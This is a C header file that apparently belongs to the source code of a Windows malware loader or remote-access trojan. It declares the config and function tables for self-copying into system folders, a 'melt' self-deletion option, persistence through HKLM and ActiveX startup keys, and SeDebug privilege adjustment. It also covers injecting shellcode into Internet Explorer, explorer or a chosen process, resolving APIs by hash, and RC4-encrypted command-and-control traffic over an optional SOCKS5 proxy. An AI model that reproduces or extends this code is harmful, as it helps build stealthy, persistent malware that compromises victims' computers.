#ifndef GLOBAL_DATA_H
#define GLOBAL_DATA_H

#include <stdio.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

#include <tchar.h>
#include <windows.h>
#include <TlHelp32.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef struct global_data global_data_t, *global_data_p;
typedef struct extra_function extra_function_t;
typedef struct explorer_thread_param explorer_thread_param_t;

#define COPY_METHOD_NONE 0
#define COPY_METHOD_TO_WINDOWS 1
#define COPY_METHOD_TO_SYSTEM 2

#define INJECT_METHOD_IEXPLORER 0
#define INJECT_METHOD_CUSTOM 1

#define INJECT_TIMES 4
#define INJECT_INTERVAL 1000 * 7

#include "apis.inc"
#include "shellcode.inc"

#pragma pack(push)
#pragma pack(1)
struct extra_function {
  union {
    u64 ptr64;
    struct {
      u32 ptr32;
      u32 dummy;
    };
  };
  u16 size;
};

#ifdef _WIN64
typedef struct x64_global_data x64_global_data_t;

struct x64_global_data {
  HMODULE kernel32;
  _LoadLibraryA xLoadLibraryA;
  _GetProcAddress xGetProcAddress;
  _CloseHandle xCloseHandle;
  _OpenProcess xOpenProcess;
  _lstrlenW xlstrlenW;
  _lstrcatW xlstrcatW;
  _lstrcpyW xlstrcpyW;
  _lstrcmpiW xlstrcmpiW;
  _Sleep xSleep;
  _VirtualAllocEx xVirtualAllocEx;
  _WriteProcessMemory xWriteProcessMemory;
  _WaitForSingleObject xWaitForSingleObject;
  _CreateToolhelp32Snapshot xCreateToolhelp32Snapshot;
  _Process32FirstW xProcess32FirstW;
  _Process32NextW xProcess32NextW;
  _ExpandEnvironmentStringsW xExpandEnvironmentStringsW;
  _CreateProcessW xCreateProcessW;
  _CreateRemoteThread xCreateRemoteThread;
  _GetSystemDirectoryW xGetSystemDirectoryW;
  _GetWindowsDirectoryW xGetWindowsDirectoryW;
  _CopyFileW xCopyFileW;
  _DeleteFileW xDeleteFileW;
  _GetProcessHeap xGetProcessHeap;
  _HeapAlloc xHeapAlloc;
  _HeapFree xHeapFree;
  _CreateMutexA xCreateMutexA;
  _GetLastError xGetLastError;
  _GetCurrentProcess xGetCurrentProcess;

  HMODULE ntdll;
  _RtlZeroMemory xRtlZeroMemory;
  _RtlMoveMemory xRtlMoveMemory;

  HMODULE advapi32;
  _OpenProcessToken xOpenProcessToken;
  _LookupPrivilegeValueA xLookupPrivilegeValueA;
  _AdjustTokenPrivileges xAdjustTokenPrivileges;
  _RegOpenKeyExA xRegOpenKeyExA;
  _RegCreateKeyExW xRegCreateKeyExW;
  _RegSetValueExW xRegSetValueExW;
  _RegCloseKey xRegCloseKey;

  wchar_t *expand_str;
  char *sedebugname;
};

#endif

struct global_data {
  u8 is_wow64;
  wchar_t loader_path[256];

  char mutex_name[100];
  u8 persistence;

  u8 melt;
  u8 copy_method;
  wchar_t copy_to[100];

  u8 startup_hklm;
  wchar_t nklm_name[100];

  u8 startup_acitvex;
  wchar_t activex_name[100];

  u8 inject_to_ie;

  u8 inject_to_custom;
  wchar_t custom_process_name[100];

  wchar_t group[12];
  wchar_t id[12];

  u8 dns_list[256];

  u8 socks5;
  u8 socks5_dns[100];
  u16 socks5_port;
  u8 socks5_user[100];
  u8 socks5_pass[100];

  u8 rc4_key[260];

  u8 send_sbox[256];
  u8 recv_sbox[256];
#ifdef _WIN64
  u32 kernel32;
  u32 xLoadLibraryA, xGetProcAddress, xGetCurrentProcess, xCloseHandle, xOpenProcess, xlstrlenA, xlstrlenW, xlstrcatW, xlstrcpyA, 
    xlstrcpyW, xlstrcmpiW, xHeapAlloc, xHeapReAlloc, xHeapFree, xGetProcessHeap, xGetModuleHandleA, xGetModuleFileNameW, xCreateMutexA, 
    xGetLastError, xSleep, xVirtualAllocEx, xVirtualFreeEx, xWriteProcessMemory, xWaitForSingleObject, xCreateToolhelp32Snapshot, 
    xProcess32FirstW, xProcess32NextW, xExpandEnvironmentStringsW, xCreateProcessW, xCreateRemoteThread, xGetSystemDirectoryW, 
    xGetWindowsDirectoryW, xCopyFileW, xDeleteFileW;

  u32 ntdll;
  u32 xRtlZeroMemory, xRtlMoveMemory, xRtlCompressBuffer, xRtlGetCompressionWorkSpaceSize, xRtlDecompressBuffer;
  
  u32 advapi32;
  u32 xOpenProcessToken, xLookupPrivilegeValueA, xAdjustTokenPrivileges, xRegOpenKeyExA, xRegCreateKeyExW, xRegSetValueExW, 
    xRegQueryValueExW, xRegCloseKey;

  u32 ws2_32;
  u32 xWSAStartup, xWSACleanup, xhtons, xinet_addr, xgethostbyname, xsocket, xclosesocket, xconnect, xsetsockopt, xsend, xrecv, xselect;
#else
  HMODULE kernel32;
  _LoadLibraryA xLoadLibraryA;
  _GetProcAddress xGetProcAddress;
  _GetCurrentProcess xGetCurrentProcess;
  _CloseHandle xCloseHandle;
  _OpenProcess xOpenProcess;
  _lstrlenA xlstrlenA;
  _lstrlenW xlstrlenW;
  _lstrcatW xlstrcatW;
  _lstrcpyA xlstrcpyA;
  _lstrcpyW xlstrcpyW;
  _lstrcmpiW xlstrcmpiW;
  _HeapAlloc xHeapAlloc;
  _HeapReAlloc xHeapReAlloc;
  _HeapFree xHeapFree;
  _GetProcessHeap xGetProcessHeap;
  _GetModuleHandleA xGetModuleHandleA;
  _GetModuleFileNameW xGetModuleFileNameW;
  _CreateMutexA xCreateMutexA;
  _GetLastError xGetLastError;
  _Sleep xSleep;
  _VirtualAllocEx xVirtualAllocEx;
  _VirtualFreeEx xVirtualFreeEx;
  _WriteProcessMemory xWriteProcessMemory;
  _WaitForSingleObject xWaitForSingleObject;
  _CreateToolhelp32Snapshot xCreateToolhelp32Snapshot;
  _Process32FirstW xProcess32FirstW;
  _Process32NextW xProcess32NextW;
  _ExpandEnvironmentStringsW xExpandEnvironmentStringsW;
  _CreateProcessW xCreateProcessW;
  _CreateRemoteThread xCreateRemoteThread;
  _GetSystemDirectoryW xGetSystemDirectoryW;
  _GetWindowsDirectoryW xGetWindowsDirectoryW;
  _CopyFileW xCopyFileW;
  _DeleteFileW xDeleteFileW;

  HMODULE ntdll;
  _RtlZeroMemory xRtlZeroMemory;
  _RtlMoveMemory xRtlMoveMemory;
  _RtlCompressBuffer xRtlCompressBuffer;
  _RtlGetCompressionWorkSpaceSize xRtlGetCompressionWorkSpaceSize;
  _RtlDecompressBuffer xRtlDecompressBuffer;

  HMODULE advapi32;
  _OpenProcessToken xOpenProcessToken;
  _LookupPrivilegeValueA xLookupPrivilegeValueA;
  _AdjustTokenPrivileges xAdjustTokenPrivileges;
  _RegOpenKeyExA xRegOpenKeyExA;
  _RegCreateKeyExW xRegCreateKeyExW;
  _RegSetValueExW xRegSetValueExW;
  _RegQueryValueExW xRegQueryValueExW;
  _RegCloseKey xRegCloseKey;

  HMODULE ws2_32;
  _WSAStartup xWSAStartup;
  _WSACleanup xWSACleanup;
  _htons xhtons;
  _inet_addr xinet_addr;
  _gethostbyname xgethostbyname;
  _socket xsocket;
  _closesocket xclosesocket;
  _connect xconnect;
  _setsockopt xsetsockopt;
  _send xsend;
  _recv xrecv;
  _select xselect;
#endif
  
  u8 extra_data[1024];

#ifdef _WIN64
  u32 get_proc_from_hash, rc4_init, rc4_crypt, alloc_memory, realloc_memory, free_memory, alloc_executable_memory, free_executable_memory,
    compress, decompress, wait_buffer, recv_data, send_data, connect_server;
#else
  _get_proc_from_hash get_proc_from_hash;
  _rc4_init rc4_init;
  _rc4_crypt rc4_crypt;
  _alloc_memory alloc_memory;
  _realloc_memory realloc_memory;
  _free_memory free_memory;
  _alloc_executable_memory alloc_executable_memory;
  _free_executable_memory free_executable_memory;
  _compress compress;
  _decompress decompress;
  _wait_buffer wait_buffer;
  _recv_data recv_data;
  _send_data send_data;
  void *connect_server;   // 这个无法在其它shellcode中使用
#endif

#ifdef _WIN64
  extra_function_t connect_by_socks5, inject_to_explorer, add_startup_hklm_x86, add_startup_activex_x86, copy_self_x86, 
    find_process_by_name_x86, inject_to_exploer_code_x86;

  HMODULE(*get_kernel32_base_x64)();
  u16 get_kernel32_base_x64_size;

  HMODULE(*get_ntdll_base_x64)();
  u16 get_ntdll_base_x64_size;

  HMODULE(*get_proc_from_hash_x64)(HMODULE, u32, _GetProcAddress);
  u16 get_proc_from_hash_x64_size;

  void(*add_startup_hklm_x64)(struct x64_global_data *, struct global_data *);
  u16 add_startup_hklm_x64_size;

  void(*add_startup_activex_x64)(struct x64_global_data *, struct global_data *);
  u16 add_startup_activex_x64_size;

  void(*copy_self_x64)(struct x64_global_data *, struct global_data *);
  u16 copy_self_x64_size;

  u32(__stdcall *find_process_by_name_x64)(struct x64_global_data *, wchar_t *);
  u16 find_process_by_name_x64_size;

  extra_function_t inject_to_explorer_code_x64;
#else
  extra_function_t connect_by_socks5, inject_to_explorer;
  
  void(__stdcall *add_startup_hklm_x86)(struct global_data *);
  u32 dummy0;
  u16 add_startup_hklm_x86_size;

  void(__stdcall *add_startup_activex_x86)(struct global_data *);
  u32 dummy1;
  u16 add_startup_activex_x86_size;

  void(__stdcall *copy_self_x86)(struct global_data *);
  u32 dummy2;
  u16 copy_self_x86_size;

  u32(__stdcall *find_process_by_name_x86)(global_data_p, wchar_t *);
  u32 dummy3;
  u16 find_process_by_name_x86_size;

  extra_function_t inject_to_explorer_code_x86, get_kernel32_base_x64, get_ntdll_base_x64, get_proc_from_hash_x64, add_startup_hklm_x64, 
    add_startup_activex_x64, copy_self_x64, find_process_by_name_x64, inject_to_explorer_code_x64;
#endif
};

struct explorer_thread_param {
  global_data_t global_data;
  u64 thread_main;
  u16 thread_main_size;
};
#pragma pack(pop)

#endif  // GLOBAL_DATA_H